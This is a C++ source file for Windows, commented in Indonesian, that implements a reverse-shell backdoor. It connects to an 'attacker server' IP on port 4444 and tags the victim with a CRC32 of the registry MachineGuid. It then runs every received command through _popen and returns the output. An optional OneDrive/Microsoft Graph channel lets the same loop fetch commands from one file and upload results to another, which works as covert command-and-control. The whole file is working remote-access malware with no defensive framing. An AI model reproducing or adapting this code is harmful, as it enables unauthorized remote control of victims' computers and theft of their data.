#include <iostream>
#include <fstream>
#include <sstream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cstdlib>
#include <cstdio>
#include <winreg.h>

// Menggunakan pustaka ws2_32 untuk soket Windows
#pragma comment(lib, "ws2_32.lib")

using namespace std;

// Fungsi untuk mengeksekusi perintah dan mengembalikan outputnya sebagai string
string execute_command(const char* cmd) {
    char buffer[128];
    string result = "";
    FILE* pipe = _popen(cmd, "r"); // Membuka proses untuk membaca output dari command
    if (!pipe) throw runtime_error("_popen() failed!");
    try {
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            result += buffer; // Membaca dan menyimpan output perintah
        }
    } catch (...) {
        _pclose(pipe); // Menutup proses jika terjadi error
        throw;
    }
    _pclose(pipe); // Menutup proses setelah selesai
    return result;
}

// Fungsi untuk mendapatkan MachineGuid dari registry Windows
string get_machine_guid() {
    HKEY hKey;
    // Membuka registry key untuk MachineGuid
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD bufferSize = sizeof(buffer);
        // Mengambil nilai MachineGuid
        if (RegQueryValueEx(hKey, "MachineGuid", NULL, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            return string(buffer); // Mengembalikan MachineGuid
        }
        RegCloseKey(hKey); // Menutup registry key
    }
    return "";
}

// Fungsi untuk menghitung CRC32 checksum dari MachineGuid, digunakan untuk identifikasi
DWORD calculate_crc32(const string& data) {
    DWORD crc = 0xFFFFFFFF;
    for (char c : data) {
        crc ^= c;
        for (int i = 0; i < 8; i++) {
            crc = (crc >> 1) ^ (0xEDB88320 & (-(crc & 1))); // Proses perhitungan CRC32
        }
    }
    return ~crc; // Mengembalikan nilai CRC32 yang telah dikomplementasikan
}

// Fungsi untuk mengunduh file dari OneDrive menggunakan API
string download_from_onedrive(const string& access_token) {
    string url = "https://graph.microsoft.com/v1.0/me/drive/root:/payload_input.txt:/content";
    string cmd = "curl -H \"Authorization: Bearer " + access_token + "\" " + url;
    return execute_command(cmd.c_str()); // Menjalankan command untuk mengunduh file
}

// Fungsi untuk mengunggah data ke OneDrive menggunakan API
void upload_to_onedrive(const string& data, const string& access_token) {
    string url = "https://graph.microsoft.com/v1.0/me/drive/root:/payload_output.txt:/content";
    string cmd = "curl -X PUT -H \"Authorization: Bearer " + access_token + "\" -d \"" + data + "\" " + url;
    execute_command(cmd.c_str()); // Menjalankan command untuk mengunggah data
}

// Fungsi utama untuk menjalankan koneksi antara server dan client serta mengirimkan data
void main_loop(const string& ip, int port, const string& access_token = "") {
    SOCKET s;
    sockaddr_in server;

    // Inisialisasi WinSock untuk membuat soket
    WSADATA wsData;
    if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
        cout << "WSAStartup failed" << endl;
        return;
    }

    // Membuat soket TCP
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        cout << "Could not create socket" << endl;
        WSACleanup();
        return;
    }

    // Menyiapkan konfigurasi server untuk menghubungkan soket
    server.sin_addr.s_addr = inet_addr(ip.c_str());
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    // Mencoba menghubungkan ke server
    if (connect(s, (sockaddr*)&server, sizeof(server)) < 0) {
        cout << "Connection failed" << endl;
        closesocket(s);
        WSACleanup();
        return;
    }

    // Mendapatkan MachineGuid dan menghitung CRC32 checksum-nya
    string machine_guid = get_machine_guid();
    if (!machine_guid.empty()) {
        DWORD crc32_checksum = calculate_crc32(machine_guid);
        string payload = "CRC32Checksum: " + to_string(crc32_checksum) + "\n";
        send(s, payload.c_str(), payload.size(), 0); // Mengirim CRC32 checksum ke server
    }

    char buffer[1024] = {0};
    while (true) {
        string command;
        if (!access_token.empty()) {
            // Jika access_token tersedia, download command dari OneDrive
            command = download_from_onedrive(access_token);
        } else {
            recv(s, buffer, sizeof(buffer), 0); // Menerima command dari server
            command = string(buffer);
        }

        // Jika command adalah "exit", hentikan loop
        if (command == "exit\n") break;

        // Menjalankan command dan mendapatkan hasil output
        string output = execute_command(command.c_str());

        // Jika access_token tersedia, unggah output ke OneDrive
        if (!access_token.empty()) {
            upload_to_onedrive(output, access_token);
        } else {
            send(s, output.c_str(), output.size(), 0); // Mengirim output kembali ke server
        }
    }

    // Menutup soket dan membersihkan WinSock
    closesocket(s);
    WSACleanup();
}

// Fungsi utama program
int main() {
    string ip = "192.168.1.1";  // Ganti dengan IP server penyerang
    int port = 4444;             // Ganti dengan port yang diinginkan
    string access_token;         // Menyimpan akses token untuk API OneDrive

    // Memanggil fungsi main_loop untuk memulai koneksi
    main_loop(ip, port, access_token);

    return 0;
}
